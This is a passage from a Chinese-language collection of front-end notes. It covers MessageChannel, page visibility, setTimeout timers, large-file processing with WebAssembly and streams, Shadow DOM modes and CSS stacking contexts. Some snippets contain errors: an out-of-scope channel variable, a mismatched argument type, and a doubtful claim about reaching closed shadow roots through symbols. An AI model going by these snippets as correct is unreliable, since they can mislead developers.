MessageChannel**\n\n## 2. 基本使用方式\n\n```javascript\n// 创建消息通道\nconst channel = new MessageChannel();\n\n// 设置 port1 的消息处理程序\nchannel.port1.onmessage = (event) => {\n    console.log('Port1 收到消息:', event.data);\n};\n\n// 通过 port2 发送消息\nchannel.port2.postMessage('你好，这是来自 Port2 的消息');\n```\n\n### 2.1. 简单示例：在控制台中直接可执行\n\n![图片&文件](./files/20241207-2.png)\n\n```javascript\n// 创建 MessageChannel\nconst channel = new MessageChannel();\nconst { port1, port2 } = channel;\n\n// 设置端口1的消息处理器\nport1.onmessage = (event) => {\n    console.log('Port1 收到消息:', event.data);\n};\n\n// 设置端口2的消息处理器\nport2.onmessage = (event) => {\n    console.log('Port2 收到消息:', event.data);\n};\n\n// 发送消息\nport1.postMessage('你好，我是端口1');\nport2.postMessage('你好，我是端口2');\n\n```\n\n## 3. 主要使用场景\n\n### 3.1. Web Worker 通信\n\n#### 3.1.1. 主进程代码\n\n```javascript\n// 主线程\nconst worker = new Worker('worker.js');\nconst channel = new MessageChannel();\n\n// 将 port2 传递给 Worker\nworker.postMessage({ port: channel.port2 }, [channel.port2]);\n\n// 监听 port1 的消息\nchannel.port1.onmessage = (event) => {\n    console.log('从 Worker 收到消息:', event.data);\n};\n\n\n```\n\n#### 3.1.2. worker.js \n\n```javascript\n// worker.js 中的代码\nself.onmessage = (event) => {\n    const port = event.data.port;\n    port.postMessage('Worker 发送的消息');\n};\n```\n\n### 3.2. iframe 之间的通信\n\n#### parent.html\n\n```html\n<!-- parent.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <iframe src=\"child.html\" id=\"myIframe\"></iframe>\n    <button onclick=\"sendMessage()\">发送消息到iframe</button>\n    \n    <script>\n        const iframe = document.getElementById('myIframe');\n        \n        iframe.onload = () => {\n            // 创建 MessageChannel\n            const channel = new MessageChannel();\n            \n            // 监听来自iframe的消息\n            channel.port1.onmessage = (event) => {\n                console.log('主页面收到消息:', event.data);\n            };\n            \n            // 将port2传递给iframe\n            iframe.contentWindow.postMessage('端口传递', '*', [channel.port2]);\n        };\n        \n        function sendMessage() {\n            channel.port1.postMessage('来自主页面的消息');\n        }\n    </script>\n</body>\n</html>\n\n\n```\n\n#### child.html\n\n```html\n<!-- child.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <button onclick=\"sendToParent()\">发送消息到父页面</button>\n    <script>\n        let port;\n        // 接收来自父页面的端口\n        window.onmessage = (event) => {\n            if (event.ports && event.ports.length) {\n                port = event.ports[0];\n                // 设置消息处理器\n                port.onmessage = (e) => {\n                    console.log('iframe收到消息:', e.data);\n                };\n            }\n        };\n        function sendToParent() {\n            port.postMessage('来自iframe的消息');\n        }\n    </script>\n</body>\n</html>\n```\n\n### 3.3. 微前端架构中的通信\n\n```javascript hl:1,12\n// 主应用\nconst channel = new MessageChannel();\nconst microApp = document.querySelector('#micro-app');\n\nmicroApp.contentWindow.postMessage({ type: 'init', port: channel.port2 }, '*', [channel.port2]);\n\nchannel.port1.onmessage = (event) => {\n    console.log('从微应用收到消息:', event.data);\n};\n\n// 微应用中\nwindow.addEventListener('message', (event) => {\n    if (event.data.type === 'init') {\n        const port = event.ports[0];\n        // 使用 port 进行通信\n    }\n});\n```\n\n### 3.4. 组件间隔离通信\n\n```javascript hl:1,10\n// 组件 A\nconst channelA = new MessageChannel();\nconst componentB = document.querySelector('#componentB');\n\ncomponentB.port = channelA.port2;\nchannelA.port1.onmessage = (event) => {\n    console.log('组件A收到消息:', event.data);\n};\n\n// 组件 B\nconst port = this.port; // 从组件属性中获取\nport.postMessage('从组件B发送消息');\n```\n\n### 3.5. 广播通道\n\n可以创建一个广播系统，where`多个窗口或标签页`可以订阅和接收消息\n\n## 4. MessageChannel 的优势\n\n1. 双向通信：两个端口都可以发送和接收消息\n2. 安全性：比直接使用 postMessage 更安全，因为通信是**点对点**的\n3. 隔离性：不同的通道之间互不干扰\n4. 性能：适合频繁通信的场景，性能较好\n\n## 5. 注意事项\n\n### 5.1. 端口传输：端口在传输时需要使用可转移对象（Transferable Objects）\n\n```javascript\n// 正确的传输方式\npostMessage({ port: port2 }, [port2]);\n```\n\n### 5.2. 端口关闭：不再需要时应该关闭端口\n\n```javascript\nport1.close();\nport2.close();\n```\n\n### 5.3. 错误处理：应该添加错误处理机制\n\n```javascript\nchannel.port1.onerror = (error) => {\n    console.error('通信错误:', error);\n};\n```\n","sU2vY2Yf":"\n# 如何检测页面是否在前台运行\n\n`#bom` \n\n>  检测页面的可见性\n\n\n## 目录\n<!-- toc -->\n ## 1. 首先说说为什么需要检测 \n\n页面被`最小化`或`隐藏`或者在`后台运行`时\n- 那么`轮询服务器`或`更新动画`等动作就不必要了。\n\n## 2. 常见的几种方法\n\n1、document.hidden 只读属性\n\n2、document.visibilityState 检测页面可见性，返回只读属性\n\n3、`visibilitychange` 事件\n\n4、`window.addEventListener()`方法监听 `blur` 和 `focus` 事件来检测页面是否在前台或后台。\n- 当**页面**失去焦点时触发 `blur` 事件\n- 而当**页面**重新获得焦点时触发 `focus` 事件。亲测可以\n\n5、`document.hasFocus()` 检测页面是否在前台，即是否获得焦点\n\n6、一些页面生命周期的方法也可以\n\n- `pagehide`\n- `beforeunload`\n- `unload` \n- `pageshow`\n\n## 3. 总结\n\n整体可以分为两类 \n\n- document上的`属性值`或者`具体方法` \n- 监听特定事件\n\n> 另外需要关注兼容性\n\n","zbgylJlz":"\n# 为什么要用 setTimeout 模拟 setInterval ？\n\n\n`#2023/03/20` `#前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 先说说 `setInterval` 的问题 \n\n`setInterval(fn, N)`;  \n- 即`fn()` 将会在 `N` 秒之后被推入`任务队列`\n- 但每次推之前，都要判断看`上次的任务是否还在队列中`，\n\t- 如果在，则不添加。所以 `setInterval` 有两个`缺点`：\n\t\t- 使用 `setInterval` 时，某些间隔会`被跳过`；\n\t\t- 甚至可能多个定时器会`连续执行` ，即刚好在两个队列的缝隙时，会`连续执行`\n\n## 2. 再看看 `setTimeout`\n\n一个经典案例：\n\n```javascript\nfor (var i = 0; i < 5; i++) {\n  setTimeout(function() {\n    console.log(i);\n  }, 1000);\n}\n```\n\n为什么是`一秒后输出了 5 个 5` 呢？ \n- `for` 是`主线程代码`，先执行完了，才轮到执行 `setTimeout`\n- 每个 `setTimeout` 产生的新的任务会直接 `push` 到`任务队列`中。\n\n而且它是`一次性`的，或者换个思路，`setInterval` 循环执行，链路长，不好控制，而 `setTimeout` 只是延时`一次` ，方便控制。\n\n## 3. 使用 `setTimeout` 来模拟 `setInterval`\n\n```javascript\nfunction mySetInterval(fn, timeout) {\n    // 关键，标识是否继续,并返回\n    let timer = {\n        flag: true\n    }\n    // 两次 settimeout，需要闭包定义一个函数\n    function func() {\n        if (timer.flag) {\n            fn();\n            setTimeout(func, timeout);\n        }\n    }\n    setTimeout(func, timeout);\n    return timer;\n}\n\n// 测试\nconst timer = mySetInterval(() => {\n    console.log('log 1');\n},1000)\n\n// 5s后，停止定时器\nsetTimeout(() => {\n    timer.flag = false;\n},5000)\n\n```\n\n> [!danger]\n 手写这种代码时，`套路` 就是 函数 里 再定义一个函数，形成`闭包`，另外需要`返回 定时标识`，另外一定会有递归，比如这里的 `func` \n\n## 4. 最后\n\n再次强调，定时器指定的`时间间隔`，表示的是 `何时将定时器的代码添加到消息队列`，而`不是何时执行代码`。 所以真正何时执行代码的时间是不能保证的，取决于`何时被主线程的事件循环取到，并执行`.\n\nW3C在HTML标准中规定，规定要求 `setTimeout` 中低于`4ms`的时间间隔算为`4ms`。\n\n## 5. 参考\n\n- [https://juejin.cn/post/6914201197620494350](https://juejin.cn/post/6914201197620494350)\n","lVxlSvqC":"\n# 浏览器本地如何读取并处理本地大文件\n\n`#bom` `#R1` \n\n几种在浏览器本地读取并处理大文件的主要方法，按照效率**从高到低排序**：\n\n\n## 目录\n<!-- toc -->\n ## 1. 使用 WebAssembly 来处理大文件 \n\n下面是一个使用 Rust + WebAssembly 实现的例子：\n\n### 1.1. 首先创建 Rust 项目\n\n```bash\ncargo new --lib wasm-file-processor\ncd wasm-file-processor\n```\n\n### 1.2. 修改 `Cargo.toml`\n\n````toml\n[package]\nname = \"wasm-file-processor\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[lib]\ncrate-type = [\"cdylib\"]\n\n[dependencies]\nwasm-bindgen = \"0.2\"\njs-sys = \"0.3\"\nweb-sys = { version = \"0.3\", features = [\"console\"] }\n````\n\n### 1.3. Rust 代码实现（`src/lib.rs`）\n\n````rust\nuse wasm_bindgen::prelude::*;\n\n`#[wasm_bindgen]`\npub struct FileProcessor {\n    buffer: Vec<u8>,\n    position: usize,\n}\n\n`#[wasm_bindgen]`\nimpl FileProcessor {\n    `#[wasm_bindgen(constructor)]`\n    pub fn new() -> FileProcessor {\n        FileProcessor {\n            buffer: Vec::new(),\n            position: 0,\n        }\n    }\n\n    pub fn process_chunk(&mut self, chunk: &[u8]) {\n        self.buffer.extend_from_slice(chunk);\n    }\n\n    pub fn get_processed_data(&self) -> Vec<u8> {\n        self.buffer.clone()\n    }\n\n    // 示例：计算文件中特定字节的出现次数\n    pub fn count_byte(&self, target: u8) -> u32 {\n        self.buffer.iter().filter(|&&b| b == target).count() as u32\n    }\n}\n````\n\n### 1.4. JavaScript 代码实现\n\n````javascript hl:9,15\n// 导入 WebAssembly 模块\nimport init, { FileProcessor } from './pkg/wasm_file_processor.js';\n\nasync function processLargeFile(file) {\n    // 初始化 WebAssembly\n    await init();\n    \n    const chunkSize = 1024 * 1024; // 1MB chunks\n    const fileProcessor = new FileProcessor();\n    let offset = 0;\n\n    while (offset < file.size) {\n        const chunk = await readChunk(file, offset, chunkSize);\n        \n        // 将 chunk 传递给 WebAssembly 处理\n        fileProcessor.process_chunk(new Uint8Array(chunk));\n        \n        offset += chunkSize;\n        // 更新进度\n        const progress = Math.round((offset / file.size) * 100);\n        console.log(`Processing: ${progress}%`);\n    }\n\n    return fileProcessor;\n}\n\nfunction readChunk(file, offset, size) {\n    return new Promise((resolve, reject) => {\n        const reader = new FileReader();\n        reader.onload = () => resolve(reader.result);\n        reader.onerror = reject;\n        \n        const slice = file.slice(offset, offset + size);\n        reader.readAsArrayBuffer(slice);\n    });\n}\n\n// 使用示例\ndocument.querySelector('input').addEventListener('change', async (e) => {\n    const file = e.target.files[0];\n    try {\n        const processor = await processLargeFile(file);\n        \n        // 示例：计算文件中字母 'a' 的出现次数\n        const count = processor.count_byte(97); // 97 是字母 'a' 的 ASCII 码\n        console.log(`Letter 'a' appears ${count} times`);\n        \n    } catch (error) {\n        console.error('Error processing file:', error);\n    }\n});\n````\n\n### 1.5. 更复杂的处理示例（在 Rust 中添加更多功能）\n\n省略\n\n### 1.6. 在 JavaScript 中使用增强的功能\n\n### 1.7. 总结\n\n使用 WebAssembly 的优势：\n\n1. **性能更好**：Rust 代码编译成 WebAssembly 后，**执行速度接近原生代码**\n2. **内存安全**：Rust 的内存安全机制可以避免很多常见的内存问题\n3. **并行处理**：可以配合 Web Workers 实现真正的并行处理\n4. **类型安全**：Rust 的强类型系统可以在编译时捕获很多错误\n\n注意事项：\n\n1. 需要配置适当的构建工具链（wasm-pack）\n2. 考虑浏览器对 WebAssembly 的支持情况\n3. 大文件处理时仍需要考虑内存管理\n4. 在开发时注意 Rust 和 JavaScript 之间的数据转换开销\n\n这个实现可以根据具体需求进行扩展，比如**添加更多的文件处理功能、压缩解压缩、图像处理**等。\n\n## 2. 使用 File System Access API\n\n````javascript hl:4,8\nasync function processLargeFile() {\n    try {\n        // 打开文件\n        const [fileHandle] = await window.showOpenFilePicker();\n        const file = await fileHandle.getFile();\n        \n        // 创建文件流\n        const stream = await file.stream();\n        const reader = stream.getReader();\n        \n        // 处理数据\n        while (true) {\n            const { done, value } = await reader.read();\n            if (done) break;\n            \n            // value 是 Uint8Array 类型\n            processChunk(value);\n        }\n    } catch (err) {\n        console.error('Error:', err);\n    }\n}\n\n// 使用示例\nbutton.onclick = processLargeFile;\n````\n\n## 3. 使用 Streams API\n\n````javascript hl:6\nasync function processLargeFile(file) {\n    const stream = file.stream();\n    const reader = stream.getReader();\n\n    // 创建转换流来处理数据\n    const transform = new TransformStream({\n        transform(chunk, controller) {\n            // 在这里处理数据块\n            const processed = processChunk(chunk);\n            controller.enqueue(processed);\n        }\n    });\n\n    // 读取并处理\n    try {\n        await reader\n            .pipeThrough(transform)\n            .pipeTo(new WritableStream({\n                write(chunk) {\n                    // 处理转换后的数据\n                    console.log('Processed chunk:', chunk);\n                }\n            }));\n    } catch (err) {\n        console.error('Error:', err);\n    }\n}\n\n// 使用示例\ninput.onchange = e => processLargeFile(e.target.files[0]);\n````\n\n## 4. 使用 Blob 切片 + Web Worker（适合需要大量计算的场景）\n\n````javascript hl:1,14,37,44\n// main.js\nfunction processLargeFile(file) {\n    const CHUNK_SIZE = 2 * 1024 * 1024; // 2MB chunks\n    let offset = 0;\n    \n    // 创建 Worker\n    const worker = new Worker('worker.js');\n    \n    function readNextChunk() {\n        const slice = file.slice(offset, offset + CHUNK_SIZE);\n        const reader = new FileReader();\n        \n        reader.onload = function(e) {\n            worker.postMessage({\n                chunk: e.target.result,\n                offset: offset,\n                done: offset >= file.size\n            });\n            \n            offset += CHUNK_SIZE;\n            if (offset < file.size) {\n                readNextChunk();\n            }\n        };\n        \n        reader.readAsArrayBuffer(slice);\n    }\n    \n    // 处理 Worker 返回的结果\n    worker.onmessage = function(e) {\n        console.log('Processed result:', e.data);\n    };\n    \n    readNextChunk();\n}\n\n// worker.js\nself.onmessage = function(e) {\n    const { chunk, offset, done } = e.data;\n    \n    // 在 Worker 中处理数据\n    const result = processChunk(chunk);\n    \n    self.postMessage({\n        result,\n        offset,\n        done\n    });\n};\n````\n\n## 5. 使用 IndexedDB 存储和处理（适合需要持久化的场景）\n\n````javascript\nasync function processWithIndexedDB(file) {\n    const db = await openDB('FileDB', 1, {\n        upgrade(db) {\n            db.createObjectStore('chunks');\n        }\n    });\n\n    // 分块存储\n    const CHUNK_SIZE = 2 * 1024 * 1024;\n    let offset = 0;\n    \n    while (offset < file.size) {\n        const chunk = file.slice(offset, offset + CHUNK_SIZE);\n        const buffer = await chunk.arrayBuffer();\n        \n        // 存储到 IndexedDB\n        await db.put('chunks', buffer, offset);\n        \n        // 处理数据\n        await processChunk(buffer);\n        \n        offset += CHUNK_SIZE;\n    }\n}\n\n// 处理单个数据块\nasync function processChunk(buffer) {\n    // 示例：计算数据块的哈希\n    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);\n    return new Uint8Array(hashBuffer);\n}\n````\n\n## 6. 实际使用建议\n\n- 如果需要实时处理：使用 Streams API\n- 如果需要大量计算：使用 Web Worker\n- 如果需要持久化：使用 IndexedDB\n- 如果需要最新特性：使用 File System Access API\n\n## 7. worker 中无法读取本地文件，限制如下\n\n**所以需要主线程读完后交给 worker 来处理**\n\n![图片&文件](./files/20241028-19.png)\n\n","Ohuh7Fgf":"\n# WebAssembly (Wasm)\n\n`#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. WebAssembly 基本概念 \n\nWebAssembly 是一种低级的**二进制格式**，可以在现代浏览器中运行，提供接近原生的性能。主要特点：\n\n- 快速执行\n- **跨平台**\n- 支持多种编程语言（C++、Rust、Go等）\n- 与JavaScript 互操作\n- **安全的沙箱环境**\n\n## 2. 基本使用示例（使用Rust）：fib\n\n````rust\n// Rust代码 (lib.rs)\nuse wasm_bindgen::prelude::*;\n\n`#[wasm_bindgen]`\npub fn fibonacci(n: u32) -> u32 {\n    if n <= 1 {\n        return n;\n    }\n    fibonacci(n - 1) + fibonacci(n - 2)\n}\n````\n\n对应的JavaScript调用：\n\n````javascript\nimport init, { fibonacci } from './pkg/my_wasm.js';\n\nasync function run() {\n    await init();\n    console.log(fibonacci(10)); // 输出第10个斐波那契数\n}\n\nrun();\n````\n\n## 3. 常见使用案例\n\n### 3.1. 图像处理\n\n````rust\n// Rust代码\n`#[wasm_bindgen]`\npub fn apply_grayscale(data: &mut [u8]) {\n    for pixel in data.chunks_mut(4) {\n        let avg = (pixel[0] as u32 + pixel[1] as u32 + pixel[2] as u32) / 3;\n        pixel[0] = avg as u8;\n        pixel[1] = avg as u8;\n        pixel[2] = avg as u8;\n    }\n}\n````\n\nJavaScript调用：\n\n````javascript\nasync function processImage(imageData) {\n    const { memory, apply_grayscale } = await init();\n    \n    // 创建共享内存\n    const array = new Uint8ClampedArray(memory.buffer, imageData.data.byteOffset, imageData.data.length);\n    \n    // 处理图像\n    apply_grayscale(array);\n    \n    // 更新canvas\n    ctx.putImageData(imageData, 0, 0);\n}\n````\n\n### 3.2. 游戏引擎\n\n````rust\n// Rust游戏逻辑\n`#[wasm_bindgen]`\npub struct GameState {\n    players: Vec<Player>,\n    world: World,\n}\n\n`#[wasm_bindgen]`\nimpl GameState {\n    pub fn new() -> GameState {\n        // 初始化游戏状态\n    }\n\n    pub fn update(&mut self) {\n        // 更新游戏逻辑\n    }\n\n    pub fn render(&self) -> Vec<u8> {\n        // 返回渲染数据\n    }\n}\n````\n\nJavaScript集成：\n\n````javascript\nimport { GameState } from './pkg/game_wasm.js';\n\nclass Game {\n    constructor() {\n        this.gameState = GameState.new();\n        this.canvas = document.getElementById('game-canvas');\n        this.ctx = this.canvas.getContext('2d');\n    }\n\n    gameLoop() {\n        this.gameState.update();\n        const renderData = this.gameState.render();\n        this.draw(renderData);\n        requestAnimationFrame(() => this.gameLoop());\n    }\n}\n````\n\n### 3.3. 音频处理\n\n````rust\n`#[wasm_bindgen]`\npub struct AudioProcessor {\n    buffer: Vec<f32>,\n}\n\n`#[wasm_bindgen]`\nimpl AudioProcessor {\n    pub fn new() -> AudioProcessor {\n        AudioProcessor {\n            buffer: Vec::new(),\n        }\n    }\n\n    pub fn process_audio(&mut self, samples: &[f32]) -> Vec<f32> {\n        // 音频处理逻辑\n        samples.iter().map(|&x| x * 0.5).collect()\n    }\n}\n````\n\nJavaScript音频处理：\n\n````javascript hl:3\nclass AudioHandler {\n    async init() {\n        const { AudioProcessor } = await import('./pkg/audio_wasm.js');\n        this.processor = AudioProcessor.new();\n        \n        const audioContext = new AudioContext();\n        const source = audioContext.createBufferSource();\n        const processor = audioContext.createScriptProcessor(2048, 1, 1);\n        \n        processor.onaudioprocess = (e) => {\n            const input = e.inputBuffer.getChannelData(0);\n            const output = e.outputBuffer.getChannelData(0);\n            \n            // 使用WASM处理音频\n            const processed = this.processor.process_audio(input);\n            output.set(processed);\n        };\n    }\n}\n````\n\n### 3.4. 密码学应用\n\n````rust\n`#[wasm_bindgen]`\npub fn hash_password(password: &str, salt: &str) -> String {\n    use argon2::{self, Config};\n    \n    let config = Config::default();\n    argon2::hash_encoded(\n        password.as_bytes(),\n        salt.as_bytes(),\n        &config\n    ).unwrap()\n}\n````\n\nJavaScript使用：\n\n````javascript\nasync function hashPassword(password) {\n    const { hash_password } = await init();\n    const salt = crypto.getRandomValues(new Uint8Array(16));\n    return hash_password(password, salt);\n}\n````\n\n### 3.5. 3D渲染\n\n````rust\n`#[wasm_bindgen]`\npub struct Renderer {\n    vertices: Vec<f32>,\n    indices: Vec<u32>,\n}\n\n`#[wasm_bindgen]`\nimpl Renderer {\n    pub fn new() -> Renderer {\n        Renderer {\n            vertices: Vec::new(),\n            indices: Vec::new(),\n        }\n    }\n\n    pub fn render_scene(&self) -> Vec<u8> {\n        // 3D渲染逻辑\n    }\n}\n````\n\n与WebGL集成：\n\n````javascript\nclass Scene {\n    async init() {\n        const { Renderer } = await import('./pkg/renderer_wasm.js');\n        this.renderer = Renderer.new();\n        \n        const gl = canvas.getContext('webgl');\n        // 设置WebGL上下文\n        \n        this.animate();\n    }\n    \n    animate() {\n        const renderData = this.renderer.render_scene();\n        // 更新WebGL缓冲区\n        requestAnimationFrame(() => this.animate());\n    }\n}\n````\n\n## 4. 性能优化建议\n\n````javascript hl:1,5,9,17\n// 1. 避免频繁的内存复制\nconst memory = new WebAssembly.Memory({ initial: 10 });\nconst sharedArray = new Uint8Array(memory.buffer);\n\n// 2. 使用Web Workers\nconst worker = new Worker('wasm-worker.js');\nworker.postMessage({ type: 'init' });\n\n// 3. 批量处理数据\nfunction batchProcess(data, batchSize = 1000) {\n    for (let i = 0; i < data.length; i += batchSize) {\n        const batch = data.slice(i, i + batchSize);\n        wasmModule.processBatch(batch);\n    }\n}\n\n// 4. 使用共享内存\nconst shared = new SharedArrayBuffer(1024);\nconst sharedInt32 = new Int32Array(shared);\n````\n\n## 5. 最佳实践\n\n- 将计算密集型任务交给 WebAssembly\n- 保持JavaScript接口简单清晰\n- 适当使用 Web Workers\n- 注意内存管理\n- 优化数据传输\n- 使用适当的工具链（wasm-pack、emscripten等）\n- 进行性能测试和对比\n\n## 6. 实际案例\n\n- a. AutoCAD Web：\n\t- 将复杂的 CAD 软件移植到网页\n\t- 实现接近桌面级的性能\n\t- 支持大型工程图纸处理\n- b. Google Earth：\n\t- 3D 地图渲染\n\t- 复杂地理数据处理\n\t- 流畅的用户交互\n- c. **Figma**：\n\t- 实时图形处理\n\t- 复杂的布局计算\n\t- 快速的界面响应\n- Unity WebGL：\n\t- 游戏引擎通过 WebAssembly 部署到网页\n- Autodesk AutoCAD Web：\n\t- 使用 C++ 编译到 WebAssembly\n- Photoshop Web 版本使用 WebAssembly\n\n## 7. WebAssembly 特别适合\n\n- 游戏开发\n- 图像/视频处理\n- 3D渲染\n- 科学计算\n- 加密算法\n- 音频处理\n- 模拟器\n- 大数据处理\n- 需要高性能的 Web 应用\n- 现有原生应用的 Web 迁移\n\n通过合理使用WebAssembly，可以显著提升Web应用的性能，特别是在计算密集型任务中。\n\n","yhU713jl":"\n# Shadow DOM 中的 closed mode 和 open mode\n\n`#浏览器`\n\n> 另可参考 [12.  Shadow dom 与 Web Component](/post/OmI51GKU.html)\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 基本概念 \n\nShadow DOM 有两种模式：\n- `open`：默认模式\n- `closed`：封闭模式\n\n创建方式：\n\n```javascript\n// open mode\nelement.attachShadow({ mode: 'open' });\n\n// closed mode\nelement.attachShadow({ mode: 'closed' });\n```\n\n## 2. 主要区别\n\n### 2.1. Open Mode（开放模式）\n\n- 外部可以访问 `shadow root`\n- 外部可以修改内容\n\n```javascript\nclass OpenComponent extends HTMLElement {\n  constructor() {\n    super();\n    // 创建 open shadow root\n    const shadow = this.attachShadow({ mode: 'open' });\n    shadow.innerHTML = `<div>Open Shadow DOM</div>`;\n  }\n}\ncustomElements.define('open-component', OpenComponent);\n\n// 外部可以访问 shadow root\nconst element = document.querySelector('open-component');\nconsole.log(element.shadowRoot); // 返回 ShadowRoot\nelement.shadowRoot.innerHTML = '<div>Modified</div>'; // 可以修改内容\n```\n\n### 2.2. Closed Mode（封闭模式）\n\n- 外部无法访问 shadow root，无法从外部修改内容\n\n```javascript\nclass ClosedComponent extends HTMLElement {\n  constructor() {\n    super();\n    // 创建 closed shadow root\n    const shadow = this.attachShadow({ mode: 'closed' });\n    shadow.innerHTML = `<div>Closed Shadow DOM</div>`;\n  }\n}\ncustomElements.define('closed-component', ClosedComponent);\n\n// 外部无法访问 shadow root\nconst element = document.querySelector('closed-component');\nconsole.log(element.shadowRoot); // 返回 null\n// 无法从外部修改内容\n```\n\n## 3. 实际应用示例\n\n### 3.1. 使用 Closed Mode 保护组件\n\n```javascript\nclass ProtectedComponent extends HTMLElement {\n  `#shadowRoot;` // 私有变量存储 shadow root 引用\n  \n  constructor() {\n    super();\n    // 存储 shadow root 引用\n    this.#shadowRoot = this.attachShadow({ mode: 'closed' });\n    \n    // 初始化组件\n    this.#init();\n  }\n  \n  `#init()` {\n    this.#shadowRoot.innerHTML = `\n      <style>\n        .container { padding: 20px; }\n        button { background: blue; color: white; }\n      </style>\n      <div class=\"container\">\n        <button>Click me</button>\n      </div>\n    `;\n    \n    // 添加事件监听器\n    const button = this.#shadowRoot.querySelector('button');\n    button.addEventListener('click', this.#handleClick.bind(this));\n  }\n  \n  `#handleClick()` {\n    // 私有方法处理点击事件\n    console.log('Button clicked');\n  }\n  \n  // 公共 API\n  updateContent(text) {\n    const button = this.#shadowRoot.querySelector('button');\n    button.textContent = text;\n  }\n}\n\ncustomElements.define('protected-component', ProtectedComponent);\n```\n\n## 4. 安全性对比\n\n### 4.1. Open Mode\n\n```javascript\n// 外部可以：\n// 1. 访问 shadow DOM\nconst openElement = document.querySelector('open-component');\nconst shadowContent = openElement.shadowRoot;\n\n// 2. 修改样式\nopenElement.shadowRoot.querySelector('button').style.background = 'red';\n\n// 3. 添加事件监听器\nopenElement.shadowRoot.querySelector('button')\n  .addEventListener('click', () => {\n    console.log('External listener');\n  });\n```\n\n### 4.2. Closed Mode\n\n```javascript\n// 外部无法：\nconst closedElement = document.querySelector('closed-component');\n\n// 1. 访问 shadow DOM\nconsole.log(closedElement.shadowRoot); // null\n\n// 2. 直接修改内部元素\n// 这些操作都将失败\ntry {\n  closedElement.shadowRoot.querySelector('button');\n} catch(e) {\n  console.log('Cannot access shadow DOM');\n}\n```\n\n## 5. 使用建议\n\n- **何时使用 Open Mode:**\n\t- 开发内部组件或可信环境\n\t- 需要外部访问和调试\n\t- 组件需要与其他组件交互\n- **何时使用 Closed Mode:**\n\t- 开发第三方组件\n\t- 需要严格的封装\n\t- 防止外部干扰\n\t- 保护敏感功能\n\n## 6. 注意事项\n\n1. **Closed Mode 不是完全安全的**\n```javascript\n// 仍然可以通过一些方法获取 closed shadow root\nconst shadowRoot = Object.getOwnPropertySymbols(element)\n  .map(s => element[s])\n  .find(v => v instanceof ShadowRoot);\n```\n\n2. **最佳实践**\n```javascript\nclass SecureComponent extends HTMLElement {\n  `#shadowRoot;`\n  `#state` = {\n    sensitive: 'private data'\n  };\n  \n  constructor() {\n    super();\n    this.#shadowRoot = this.attachShadow({ mode: 'closed' });\n    \n    // 组合使用多种保护机制\n    // 1. Closed mode\n    // 2. 私有字段\n    // 3. 封装的公共 API\n    this.#initialize();\n  }\n  \n  `#initialize()` {\n    // 私有初始化逻辑\n  }\n  \n  // 公共 API\n  publicMethod() {\n    // 受控的外部接口\n  }\n}\n```\n\n## 7. 总结\n\n- `closed` mode 提供了更好的封装性，但不应该被视为完全的安全机制。\n- 它更多是一种表明\" ==这是私有实现，请不要访问==\"的设计意图声明。\n\t- 在实际应用中，通常需要结合其他技术（如私有字段、Symbol）来实现更完善的组件封装。","EMLLYket":"\n# 堆叠上下文 与 z-index 的关系\n\n`#R1` `#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. 什么是堆叠上下文？ \n\n堆叠上下文（Stacking Context）是 HTML 元素在渲染时的**三维概念化模型**，它沿着假想的 z 轴延伸，决定了元素在重叠时的显示顺序。可以将其想象成一个层级系统或容器，其中的内容按照特定规则进行分层和渲染。\n\n## 2. 堆叠上下文的形成条件\n\n以下情况会创建新的堆叠上下文：\n\n```css\n/* 1. 文档根元素 <html> */\n\n/* 2. position 不为 static 且设置了 z-index 值的元素 */\n.element {\n    position: relative;\n    z-index: 1;\n}\n\n/* 3. position 为 fixed 或 sticky 的元素 */\n.element {\n    position: fixed;\n}\n\n/* 4. flex 容器的子元素且 z-index 不为 auto */\n.flex-child {\n    z-index: 1;\n}\n\n/* 5. grid 容器的子元素且 z-index 不为 auto */\n.grid-child {\n    z-index: 1;\n}\n\n/* 6. opacity 值小于 1 的元素 */\n.element {\n    opacity: 0.99;\n}\n\n/* 7. transform 不为 none 的元素 */\n.element {\n    transform: scale(1);\n}\n\n/* 8. filter 不为 none 的元素 */\n.element {\n    filter: blur(0px);\n}\n\n/* 9. perspective 不为 none 的元素 */\n.element {\n    perspective: 1000px;\n}\n\n/* 10. isolation 为 isolate 的元素 */\n.element {\n    isolation: isolate;\n}\n\n/* 11. will-change 指定了任何属性 */\n.element {\n    will-change: opacity;\n}\n\n/* 12. contain 为 layout、paint 的元素 */\n.element {\n    contain: layout;\n}\n\n/* 13. backdrop-filter 不为 none 的元素 */\n.element {\n    backdrop-filter: blur(10px);\n}\n\n/* 14. mix-blend-mode 不为 normal 的元素 */\n.element {\n    mix-blend-mode: multiply;\n}\n```\n\n\n\n### 2.1. 根元素（默认）\n\n- 文档根元素 `<html>` 自动生成堆叠上下文\n\n### 2.2. 定位相关\n\n```css\n/* 以下条件会创建堆叠上下文 */\n.stacking-context {\n    /* 1. 定位元素 + z-index */\n    position: relative | absolute | fixed | sticky;\n    z-index: <number>; /* 不为 auto */\n    \n    /* 2. 固定定位元素 */\n    position: fixed;\n    \n    /* 3. 粘性定位元素 */\n    position: sticky;\n}\n```\n\n### 2.3. CSS 属性触发\n\n```css\n.stacking-context {\n    /* 透明度 */\n    opacity: <number>; /* 小于1 */\n    \n    /* 变换 */\n    transform: <transform-function>;\n    \n    /* 滤镜 */\n    filter: <filter-function>;\n    \n    /* 混合模式 */\n    mix-blend-mode: <blend-mode>;\n    \n    /* 隔离 */\n    isolation: isolate;\n    \n    /* 其他 */\n    perspective: <length>;\n    clip-path: <clip-source>;\n    mask: <mask-layer>;\n    backdrop-filter: <filter-function>;\n}\n```\n\n### 2.4. 新特性触发\n\n```css\n.stacking-context {\n    /* 性能优化属性 */\n    will-change: opacity, transform;\n    \n    /* 包含属性 */\n    contain: layout | paint;\n    \n    /* 层合成属性 */\n    perspective: 1000px;\n}\n```\n\n## 3. 堆叠顺序（Stacking Order）\n\n在同一个堆叠上下文内，元素按照以下顺序**从后到前堆叠**：\n\n1. 堆叠上下文的根元素的背景和边框\n2. z-index 为负值的定位子元素（按照 z-index 值从小到大）\n3. 常规流中的非定位子元素、块级盒子\n4. 浮动元素\n5. 常规流中的内联元素\n6. z-index 为 auto 或 0 